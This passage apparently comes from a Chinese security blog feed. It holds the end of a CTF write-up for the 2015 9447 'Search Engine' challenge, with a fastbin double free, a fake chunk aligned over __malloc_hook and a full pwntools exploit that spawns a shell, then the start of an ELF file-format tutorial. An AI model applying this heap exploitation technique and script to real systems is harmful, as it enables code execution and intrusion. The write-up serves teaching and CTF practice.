)检测的因为他是第一个释放的chunk，fastbin单链表只使用fd执行单向链接，所以她的fd为0</p><p>只需要将b释放这样b-&gt;fd指向a，且a的fd指向b，循环链表</p><p><img src="/2023/03/19/2015-9447-CTF-Search-Engine/image-20230817100848581.png" alt="image-20230817100848581"></p><h2 id="字节错位-Arbitrary-Alloc-and-malloc-hook"><a href="#字节错位-Arbitrary-Alloc-and-malloc-hook" class="headerlink" title="字节错位 Arbitrary Alloc and malloc hook"></a>字节错位 Arbitrary Alloc and malloc hook</h2><p>有了循环链表我们就可以伪造或者找一个fakechunk进行申请</p><p>有了main_arena地址后，我们想mallochook，malloc__hook在main_arean的上面是0x10字节处，</p><p><img src="/2023/03/19/2015-9447-CTF-Search-Engine/image-20230320000552113.png" alt="image-20230320000552113"></p><p>我们直接用find_fake_fast在上面利用字节错位找到一个chunk</p><p><img src="/2023/03/19/2015-9447-CTF-Search-Engine/image-20230320000725835.png" alt="image-20230320000725835"></p><p><img src="/2023/03/19/2015-9447-CTF-Search-Engine/image-20230320000936214.png" alt="image-20230320000936214"></p><p>fakechunk偏移为main_arean的上面-0x33</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#<span class="meta">#<span class="keyword">define</span> fastbin_index(sz)                                                      \</span></span><br><span class="line"><span class="meta">    ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span></span><br></pre></td></tr></table></figure><p>这里0x7f fastbin_index后为5，0x70的chunk，这里由于fastbin是分组的单链表，只有相同大小的freechunk才会构成单链表，所以我们需要在前面构成循环链表的大小为0x70，即申请0x60，同时我们需要在申请0x60大小申请到这个fakechunk</p><table><thead><tr><th>fastbinsY[]</th><th>x86（size_t&#x3D;4）</th><th>x64（size_t&#x3D;8）</th></tr></thead><tbody><tr><td>0</td><td>0x10</td><td>0x20</td></tr><tr><td>1</td><td>0x18</td><td>0x30</td></tr><tr><td>2</td><td>0x20</td><td>0x40</td></tr><tr><td>3</td><td>0x28</td><td>0x50</td></tr><tr><td>4</td><td>0x30</td><td>0x60</td></tr><tr><td>5</td><td>0x38</td><td>0x70</td></tr><tr><td>6</td><td>0x40</td><td>0x80</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fakechunk=main_arena-<span class="number">0x33</span></span><br><span class="line">fake_chunk = p64(fakechunk).ljust(<span class="number">0x60</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">index_sentence(fake_chunk)</span><br></pre></td></tr></table></figure><p>这次会申请到b，这样我们可以控制b的fd指针为fakechunk</p><p><img src="/2023/03/19/2015-9447-CTF-Search-Engine/image-20230320002318652.png" alt="image-20230320002318652"></p><p>再申请两次0x60大小chunk就可以申请到fakechunk</p><p>fakechunk距离malloc_hook0x23,我们是往fakechunk+0x10写数据，所以需要0x13大小padding</p><p>写入onegadget</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/Desktop&gt; one_gadget ./libc-2.23.so </span><br><span class="line">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">index_sentence(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x60</span>)</span><br><span class="line">index_sentence(<span class="string">b&#x27;b&#x27;</span> * <span class="number">0x60</span>)</span><br><span class="line">one_gadget_addr = libc + <span class="number">0xf1247</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x13</span> + p64(one_gadget_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x60</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">index_sentence(payload)</span><br></pre></td></tr></table></figure><p>拿到shell,跑路喽</p><p><img src="/2023/03/19/2015-9447-CTF-Search-Engine/image-20230320003959634.png" alt="image-20230320003959634"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./search&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index_sentence</span>(<span class="params">s</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3: Quit\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Enter the sentence size:\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(s)).encode())</span><br><span class="line">    io.send(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_word</span>(<span class="params">word</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3: Quit\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Enter the word size:\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(word)).encode())</span><br><span class="line">    io.send(word)</span><br><span class="line"><span class="comment"># db(&#x27;b *0x400B41&#x27;)#judge</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x0400B41&#x27;)# rcx</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x400BED&#x27;)</span></span><br><span class="line">smallbin_sentence = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x85</span> + <span class="string">b&#x27; b&#x27;</span></span><br><span class="line">index_sentence(smallbin_sentence)</span><br><span class="line">search_word(<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">search_word(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Found 135: &#x27;</span>)</span><br><span class="line">unsortbin_addr = u64(io.recv(<span class="number">8</span>))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">main_arena=unsortbin_addr-<span class="number">88</span></span><br><span class="line">libc=main_arena-<span class="number">0x3C4B20</span></span><br><span class="line">p(<span class="string">&#x27;libc&#x27;</span>,libc)</span><br><span class="line">index_sentence(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x5e</span> + <span class="string">b&#x27; d&#x27;</span>)</span><br><span class="line">index_sentence(<span class="string">b&#x27;b&#x27;</span> * <span class="number">0x5e</span> + <span class="string">b&#x27; d&#x27;</span>)</span><br><span class="line">index_sentence(<span class="string">b&#x27;c&#x27;</span> * <span class="number">0x5e</span> + <span class="string">b&#x27; d&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">search_word(<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">search_word(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)  <span class="comment">#b</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;n&#x27;</span>)  <span class="comment">#a</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;n&#x27;</span>)  <span class="comment">#first chunk</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">fakechunk=main_arena-<span class="number">0x33</span></span><br><span class="line">fake_chunk = p64(fakechunk).ljust(<span class="number">0x60</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">index_sentence(fake_chunk)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">index_sentence(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x60</span>)</span><br><span class="line">index_sentence(<span class="string">b&#x27;b&#x27;</span> * <span class="number">0x60</span>)</span><br><span class="line">one_gadget_addr = libc + <span class="number">0xf1247</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x13</span> + p64(one_gadget_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x60</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">index_sentence(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Unsorted Bin Leak </tag>
            
            <tag> Byte misalignmen </tag>
            
            <tag> Double Free </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ELF文件解析(ELF File Parsing)</title>
      <link href="/2023/03/19/23-2-21-elf/"/>
      <url>/2023/03/19/23-2-21-elf/</url>
      
        <content type="html"><![CDATA[<h1 id="ELF-File-Parsing"><a href="#ELF-File-Parsing" class="headerlink" title="ELF File Parsing"></a>ELF File Parsing</h1><p>​<strong>Executable and Linkable Format</strong></p><p>实验材料：010editor readelf objdump linux_ls文件(x86-64)</p><p>资料讲解32位elf，实验解析64位elf</p><p>ls文件信息</p><p>链接：<a href="https://pan.baidu.com/s/17ElUYwRhtW0eRRED4SgNDA">https://pan.baidu.com/s/17ElUYwRhtW0eRRED4SgNDA</a><br>提取码：ldss</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/test]</span><br><span class="line">└─$ checksec ./ls    </span><br><span class="line">[*] &#x27;/home/kali/Desktop/test/ls&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled                                                    </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop/test]</span><br><span class="line">└─$ file ./ls    </span><br><span class="line">./ls: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=15dfff3239aa7c3b16a71e6b2e3b6e4009dab998, for GNU/Linux 3.2.0, stripped</span><br><span class="line">┌──(kali㉿kali)-[~/Desktop/test]</span><br><span class="line">└─$ ldd ./ls               </span><br><span class="line">        linux-vdso.so.1 (0x00007ffcd2d86000)</span><br><span class="line">        libselinux.so.1 =&gt; /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007ff70107a000)</span><br><span class="line">        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ff700e99000)</span><br><span class="line">        libpcre2-8.so.0 =&gt; /lib/x86_64-linux-gnu/libpcre2-8.so.0 (0x00007ff700dff000)</span><br><span class="line">        /lib64/ld-linux-x86-64.so.2 (0x00007ff7010e6000)</span><br></pre></td></tr></table></figure><table><thead><tr><th>名称</th><th>长度</th><th>对齐方式</th><th>用途</th></tr></thead><tbody><tr><td>Elf32_Addr</td><td>4</td><td>4</td><td>无符号程序地址</td></tr><tr><td>Elf32_Half</td><td>2</td><td>2</td><td>无符号半整型</td></tr><tr><td>Elf32_Off</td><td>4</td><td>4</td><td>无符号文件偏移</td></tr><tr><td>Elf32_Sword</td><td>4</td><td>4</td><td>有符号大整型</td></tr><tr><td>Elf32_Word</td><td>4</td><td>4</td><td>无符号大整型</td></tr><tr><td>unsigned char</td><td>1</td><td>1</td><td>无符号小整型</td></tr></tbody></table><p><img src="/2023/03/19/23-2-21-elf/image-20230221233642860.png" alt="image-20230221233642860"></p><h2 id="ELF-Header"><a href="#ELF-Header" class="headerlink" title="ELF Header"></a>ELF Header</h2><ul><li>ELF文件头表（ELF header）<ul><li>记录了ELF文件的组织结构</li></ul></li></ul><p>除了ELF头部表以外，其它部分都没有严格的顺序。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> EI_NIDENT   16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>   e_ident[EI_NIDENT]; <span class="comment">/* ELF文件标识 */</span></span><br><span class="line">    Elf32_Half      e_type;             <span class="comment">/* 文件类型 */</span></span><br><span class="line">    Elf32_Half      e_machine;          <span class="comment">/* 机器类型 */</span></span><br><span class="line">    Elf32_Word      e_version;          <span class="comment">/* 文件版本 */</span></span><br><span class="line">    Elf32_Addr      e_entry;            <span class="comment">/* 程序入口地址 */</span></span><br><span class="line">    Elf32_Off       e_phoff;            <span class="comment">/* 程序头表偏移 */</span></span><br><span class="line">    Elf32_Off       e_shoff;            <span class="comment">/* 节头表偏移 */</span></span><br><span class="line">    Elf32_Word      e_flags;            <span class="comment">/* 文件标志 */</span></span><br><span class="line">    Elf32_Half      e_ehsize;           <span class="comment">/* ELF头大小 */</span></span><br><span class="line">    Elf32_Half      e_phentsize;        <span class="comment">/* 程序头表项大小 */</span></span><br><span class="line">    Elf32_Half      e_phnum;            <span class="comment">/* 程序头表项数量 */</span></span><br><span class="line">    Elf32_Half      e_shentsize;        <span class="comment">/* 节头表项大小 */</span></span><br><span class="line">    Elf32_Half      e_shnum;            <span class="comment">/* 节头表项数量 */</span></span><br><span class="line">    Elf32_Half      e_shstrndx;         <span class="comment">/* 节头表字符串表索引 */</span></span><br><span class="line">&#125; Elf32_Ehdr;</span><br></pre></td></tr></table></figure><h3 id="readelf"><a href="#readelf" class="headerlink" title="readelf"></a>readelf</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">└─$ readelf -h ./ls</span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 </span><br><span class="line">  Class:                             ELF64</span><br><span class="line">  Data:                              2&#x27;s complement, little endian</span><br><span class="line">  Version:                           1 (current)</span><br><span class="line">  OS/ABI:                            UNIX - System V</span><br><span class="line">  ABI Version:                       0</span><br><span class="line">  Type:                              DYN (Position-Independent Executable file)</span><br><span class="line">  Machine:                           Advanced Micro Devices X86-64</span><br><span class="line">  Version:                           0x1</span><br><span class="line">  Entry point address:               0x61d0</span><br><span class="line">  Start of program headers:          64 (bytes into file)</span><br><span class="line">  Start of section headers:          149360 (bytes into file)</span><br><span class="line">  Flags:                             0x0</span><br><span class="line">  Size of this header:               64 (bytes)</span><br><span class="line">  Size of program headers:           56 (bytes)</span><br><span class="line">  Number of program headers:         13</span><br><span class="line">  Size of section headers:           64 (bytes)</span><br><span class="line">  Number of section headers:         31</span><br><span class="line">  Section header string table index: 30</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="e-dient"><a href="#e-dient" class="headerlink" title="e_dient"></a>e_dient</h3><ul><li>共16个字节</li><li>头4个字节，被称作 “魔数”，标识该文件是一个 ELF 目标文件。固定为<code>7f 45 4c 46</code>(.ELF)，和windows下PE(Portable Executable)文件的<code>4D 5A</code>(MZ)类似，改掉会崩溃</li><li>下一个字节标识文件的类型 <ul><li>0无效类型 </li><li>1 32文件 </li><li>2 64位文件</li></ul></li><li>下一个字节标识数据的编码方式<ul><li>0 无效</li><li>1 小端序 LSB</li><li>2 大端序 MSB</li></ul></li><li>后面字节不看了，因为除了.ELF签名，其他没有用,改掉后程序依旧可以正常运行，只是会迷惑掉解析软件罢了</li></ul><p><img src="/2023/03/19/23-2-21-elf/image-20230221231314941.png" alt="image-20230221231314941"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">└─$ readelf -h ./ls</span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 0e ee ee ee ee ee ee ee ee ee ee ee </span><br><span class="line">  Class:                             &lt;unknown: e&gt;</span><br><span class="line">  Data:                              &lt;unknown: ee&gt;</span><br><span class="line">  Version:                           238 &lt;unknown&gt;</span><br><span class="line">  OS/ABI:                            &lt;unknown: ee&gt;</span><br><span class="line">  ABI Version:                       238</span><br><span class="line">  Type:                              DYN (Shared object file)</span><br><span class="line">  Machine:                           Advanced Micro Devices X86-64</span><br><span class="line">  Version:                           0x1</span><br><span class="line">  Entry point address:               0x61d0</span><br><span class="line">  Start of program headers:          0 (bytes into file)</span><br><span class="line">  Start of section headers:          64 (bytes into file)</span><br><span class="line">  Flags:                             0x0</span><br><span class="line">  Size of this header:               18288 (bytes)</span><br><span class="line">  Size of program headers:           2 (bytes)</span><br><span class="line">  Number of program headers:         0</span><br><span class="line">  Size of section headers:           0 (bytes)</span><br><span class="line">  Number of section headers:         0</span><br><span class="line">  Section header string table index: 0</span><br><span class="line">readelf: Warning: possibly corrupt ELF file header - it has a non-zero section header offset, but no section headers</span><br></pre></td></tr></table></figure><h3 id="e-type"><a href="#e-type" class="headerlink" title="e_type"></a>e_type</h3><p>不能随意修改</p><table><thead><tr><th align="left">名称</th><th align="left">值</th><th align="left">意义</th></tr></thead><tbody><tr><td align="left">ET_NONE</td><td align="left">0</td><td align="left">无文件类型</td></tr><tr><td align="left">ET_REL</td><td align="left">1</td><td align="left">可重定位文件</td></tr><tr><td align="left">ET_EXEC</td><td align="left">2</td><td align="left">可执行文件</td></tr><tr><td align="left">ET_DYN</td><td align="left">3</td><td align="left">共享目标文件</td></tr><tr><td align="left">ET_CORE</td><td align="left">4</td><td align="left">核心转储文件</td></tr><tr><td align="left">ET_LOPROC</td><td align="left">0xff00</td><td align="left">处理器指定下限</td></tr><tr><td align="left">ET_HIPROC</td><td align="left">0xffff</td><td align="left">处理器指定上限</td></tr></tbody></table><p>这里ls头部信息中的类型竟然是共享库文件，而我们查看的是可执行文件，发现开启pie的程序都会被识别为3</p><p><code>PIE</code>能使程序像共享库一样在主存任何位置装载，这需要将程序编译成位置无关，并链接为<code>ELF</code>共享对象。</p><h3 id="e-machine"><a href="#e-machine" class="headerlink" title="e_machine"></a>e_machine</h3><p>可运行的机器架构</p><p>不能随意修改</p><table><thead><tr><th align="left">名称</th><th align="left">值</th><th align="left">意义</th></tr></thead><tbody><tr><td align="left">EM_NONE</td><td align="left">0</td><td align="left">无机器类型</td></tr><tr><td align="left">EM_M32</td><td align="left">1</td><td align="left">AT&amp;T WE 32100</td></tr><tr><td align="left">EM_SPARC</td><td align="left">2</td><td align="left">SPARC</td></tr><tr><td align="left">EM_386</td><td align="left">3</td><td align="left">Intel 80386</td></tr><tr><td align="left">EM_68K</td><td align="left">4</td><td align="left">Motorola 68000</td></tr><tr><td align="left">EM_88K</td><td align="left">5</td><td align="left">Motorola 88000</td></tr><tr><td align="left">EM_860</td><td align="left">7</td><td align="left">Intel 80860</td></tr><tr><td align="left">EM_MIPS</td><td align="left">8</td><td align="left">MIPS RS3000</td></tr></tbody></table><h3 id="e-version"><a href="#e-version" class="headerlink" title="e_version"></a>e_version</h3><p>可修改</p><p>系统版本</p><h3 id="e-entry"><a href="#e-entry" class="headerlink" title="e_entry"></a>e_entry</h3><p>不可修改</p><p>系统转交控制权给 ELF 中相应代码的虚拟地址,也就是给pc的值，很重要 ,可以做入口点hook</p><h3 id="e-phoff"><a href="#e-phoff" class="headerlink" title="e_phoff"></a>e_phoff</h3><p>不可修改</p><p>Program Header table OFFset</p><p>程序头部表在elf中的偏移</p><h3 id="e-shoff"><a href="#e-shoff" class="headerlink" title="e_shoff"></a>e_shoff</h3><p>可修改</p><p>Section Header table OFFset</p><p>节头表在elf中偏移</p><h3 id="e-flags"><a href="#e-flags" class="headerlink" title="e_flags"></a>e_flags</h3><p>可修改</p><p>具体架构版本</p><h3 id="e-ehsize"><a href="#e-ehsize" class="headerlink" title="e_ehsize"></a>e_ehsize</h3><p>可修改</p><p>ELF HEADER 长度</p><h3 id="e-phentsize"><a href="#e-phentsize" class="headerlink" title="e_phentsize"></a>e_phentsize</h3><p>不可修改</p><p>Program Header ENTry SIZE</p><p>program header table是个结构体数组，参数描述结构体大小</p><h3 id="e-phnum"><a href="#e-phnum" class="headerlink" title="e_phnum"></a>e_phnum</h3><p>不可修改</p><p>Program Header entry NUMber</p><p>program header table结构体个数</p><h3 id="e-shentsize"><a href="#e-shentsize" class="headerlink" title="e_shentsize"></a>e_shentsize</h3><p>可修改</p><p>Section Header ENTry SIZE</p><p>section结构体大小</p><h3 id="e-shnum"><a href="#e-shnum" class="headerlink" title="e_shnum"></a>e_shnum</h3><p>可修改</p><p>Section Header NUMber</p><p>section结构体个数</p><h3 id="e-shstrndx"><a href="#e-shstrndx" class="headerlink" title="e_shstrndx"></a>e_shstrndx</h3><p>可修改</p><p><strong>关于Program Header table 的项基本都不可以改，Section Header Table基本可改，不影响执行</strong></p><h2 id="Program-Header-table"><a href="#Program-Header-table" class="headerlink" title="Program Header table"></a>Program Header table</h2><p><strong>程序的头部只有对于可执行文件和共享目标文件有意义。</strong></p><ul><li>程序头表&#x2F;段表（Program header table）<ul><li>告诉系统如何创建进程</li><li>生成进程的可执行文件必须拥有此结构</li><li>重定位文件不一定需要</li></ul></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word    p_type;<span class="comment">/* Segment type */</span></span><br><span class="line">  Elf64_Word    p_flags;<span class="comment">/* Segment flags */</span></span><br><span class="line">  Elf64_Off    p_offset;<span class="comment">/* Segment file offset */</span></span><br><span class="line">  Elf64_Addr    p_vaddr;<span class="comment">/* Segment virtual address */</span></span><br><span class="line">  Elf64_Addr    p_paddr;<span class="comment">/* Segment physical address */</span></span><br><span class="line">  Elf64_Xword    p_filesz;<span class="comment">/* Segment size in file */</span></span><br><span class="line">  Elf64_Xword    p_memsz;<span class="comment">/* Segment size in memory */</span></span><br><span class="line">  Elf64_Xword    p_align;<span class="comment">/* Segment alignment */</span></span><br><span class="line">&#125; Elf64_Phdr;</span><br></pre></td></tr></table></figure><h3 id="p-type"><a href="#p-type" class="headerlink" title="p_type"></a>p_type</h3><p>PT_LOAD  1  此类型段为一个可加载的段，大小由 p_filesz 和 p_memsz 描述。文件中的字节被映射到相应内存段开始处。如果 p_memsz 大于 p_filesz，“剩余” 的字节都要被置为 0。p_filesz 不能大于 p_memsz。可加载的段在程序头部中按照 p_vaddr 的升序排列。</p><p>PT_GNU_RELRO 用于指示 GNU ld linker 链接器如何将某些段放置到进程地址空间中以实现地址空间的保护。<code>PT_GNU_RELRO</code> 中的 <code>RELRO</code> 是 “RELocation Read-Only” 的缩写。它指定了一个区段，该区段包含了程序的只读数据段 (如 .rodata) 中所有的全局偏移表 (Global Offset Table，简称 GOT) 和重定位表 (Relocation Table)，并将这个区段设置为只读。这样做的目的是防止程序在运行时被攻击者利用 GOT 篡改，提高程序的安全性。</p><p>我们只关注一下需要加载到内存的段就可以 </p><h3 id="以ls-program-head-table-为例分析"><a href="#以ls-program-head-table-为例分析" class="headerlink" title="以ls program head table 为例分析"></a>以ls program head table 为例分析</h3><p><img src="/2023/03/19/23-2-21-elf/image-20230223004348967.png" alt="image-20230223004348967"></p><p>可以看到有四个段需要加载到内存的可加载段，在此之前，需要有两个段(&#x3D;&#x3D;静态链接不需要&#x3D;&#x3D;)，一个是Program Header 另一个是 Interpreter Path(解释器路径)</p><ul><li><p>Program Header</p><p><img src="/2023/03/19/23-2-21-elf/image-20230223163500827.png" alt="image-20230223163500827"></p><p>对程序加载又有的只有p_offset_FROM_FILE_BEGIN和p_vaddr_virtual_addrees这两个值又必须和ELF Header里的e_phoff一样，这样做是为了在解析elf时如果给的文件指针是program header table地址，而又需要elf header时(比如需要程序入口点)，将该指针减去这个offset就可以找到elf header，毕竟只有elf header位置固定在文件开头</p></li><li><p>Interpreter Path</p><p><img src="/2023/03/19/23-2-21-elf/image-20230223165238248.png" alt="image-20230223165238248"></p><p>表示在文件偏移offset 为0x318的位置读取LENGTH为28字节的解释器地址，来加载下面的loadable段到进程内存</p><p><code>/lib64/ld-linux-x86-64.so.2</code> 是 Linux x86-64 系统下的动态链接器（dynamic linker）文件，它的主要作用是在程序运行时，将程序所需的共享库（shared library）加载到内存中，并将这些共享库中未定义的符号与程序中定义的符号进行链接，从而使程序能够正常执行。</p></li><li><p>Loadable segment</p><p><img src="/2023/03/19/23-2-21-elf/image-20230309185924942.png" alt="image-20230309185924942"></p><p>利用mmap向pie+virtual_address处映射从file_begin开始raw_length大小的数据，前面映射必须从页对齐开始，后面必须按4096对齐(页对齐)结束</p></li><li><p>Dynamic segment</p><p><img src="/2023/03/19/23-2-21-elf/image-20230318221408017.png" alt="image-20230318221408017"></p><p>这里面保存了动态链接器所需的基本信息，如依赖于哪些共享对象、动态链接符号表的位置、共享对象初始化代码的地址等</p><p>从这里开始我们已经把磁盘上的文件加载到了内存，也就是说我们不会再用到这里的任何和文件相关的地址</p><p>这个段标记的数据，也是一个结构体数组，如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Sxword    d_tag;<span class="comment">/* Dynamic entry type *64位程序占8bit 用于区分各种指定信息类型的标记，该结构中的共用体根据该标志进行解释/</span></span><br><span class="line"><span class="comment">  union</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      Elf64_Xword d_val;        /* Integer value */</span></span><br><span class="line">      Elf64_Addr d_ptr;            <span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;                     <span class="number">64</span>位程序占<span class="number">8b</span>it 或者保存一个虚拟地址，或者保存一个整数，可以根据特定的标志进行解释。</span><br><span class="line">&#125; Elf64_Dyn;</span><br><span class="line"><span class="comment">/* Legal values for d_tag (dynamic entry type).  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_NULL        0<span class="comment">/* Marks end of dynamic section */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_NEEDED    1<span class="comment">/* Name of needed library */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PLTRELSZ    2<span class="comment">/* Size in bytes of PLT relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PLTGOT    3<span class="comment">/* Processor defined value */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_HASH        4<span class="comment">/* Address of symbol hash table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_STRTAB    5<span class="comment">/* Address of string table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMTAB    6<span class="comment">/* Address of symbol table 